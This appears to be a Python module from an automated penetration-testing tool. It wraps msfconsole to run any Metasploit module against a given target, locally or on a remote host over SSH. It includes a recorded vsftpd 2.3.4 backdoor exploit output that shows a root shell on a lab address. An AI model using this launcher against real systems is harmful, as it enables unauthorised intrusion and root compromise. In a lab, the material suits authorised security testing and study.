"""
tools/msf_runner.py — Subprocess wrapper for msfconsole.

Builds and runs a Metasploit resource script for a given module.
Demo mode returns a pre-recorded fixture instead of launching msfconsole.
"""

import subprocess
import textwrap
from pathlib import Path

from config import DEMO_MODE, SANDBOX_DIR
from tools.ssh_runner import SSHRunner

# Pre-recorded output for CVE-2011-2523 (vsftpd backdoor)
# Used when DEMO_MODE=true so the demo never depends on msfconsole availability.
_VSFTPD_FIXTURE = """
[*] Started reverse TCP handler on 0.0.0.0:4444
[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.101:21 - USER: 331 Please specify the password.
[+] 192.168.56.101:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.101:6200)
"""

_FIXTURE_MAP = {
    "exploit/unix/ftp/vsftpd_234_backdoor": _VSFTPD_FIXTURE,
}


def run_msf_module(
    msf_module: str,
    target_ip: str,
    target_port: int,
    session_id: str,
    attacker: dict = None,
) -> dict:
    """
    Run a Metasploit module and return stdout.

    Returns:
        { "stdout": str, "succeeded": bool }
    """
    if DEMO_MODE:
        fixture = _FIXTURE_MAP.get(msf_module, "[*] Module ran (demo mode fixture)")
        return {"stdout": fixture, "succeeded": "Found shell" in fixture or "session" in fixture}

    resource_script = textwrap.dedent(f"""
        use {msf_module}
        set RHOSTS {target_ip}
        set RPORT {target_port}
        set LHOST 0.0.0.0
        run
        exit
    """)

    script_path = Path(SANDBOX_DIR) / session_id / "msf.rc"
    script_path.parent.mkdir(parents=True, exist_ok=True)
    script_path.write_text(resource_script)

    if attacker:
        runner = SSHRunner(attacker["ip"], attacker["username"], attacker["password"])
        remote_script_path = f"/tmp/{session_id}_msf.rc"
        runner.upload_file(script_path, remote_script_path)
        
        # Run msfconsole remotely
        res = runner.run_command(f"msfconsole -q -r {remote_script_path}", timeout=120)
        runner.run_command(f"rm -f {remote_script_path}", timeout=10)
        
        stdout = res.get("stdout", "")
        succeeded = any(kw in stdout for kw in ("session", "Found shell", "uid=0", "Command shell session"))
        return {"stdout": stdout, "succeeded": succeeded}

    try:
        result = subprocess.run(
            ["msfconsole", "-q", "-r", str(script_path)],
            capture_output=True,
            text=True,
            timeout=120,
        )
        stdout = result.stdout
        succeeded = any(kw in stdout for kw in ("session", "Found shell", "uid=0"))
    except FileNotFoundError:
        stdout = "Error: msfconsole not found on system PATH. Skipping Metasploit exploit."
        succeeded = False

    return {"stdout": stdout, "succeeded": succeeded}
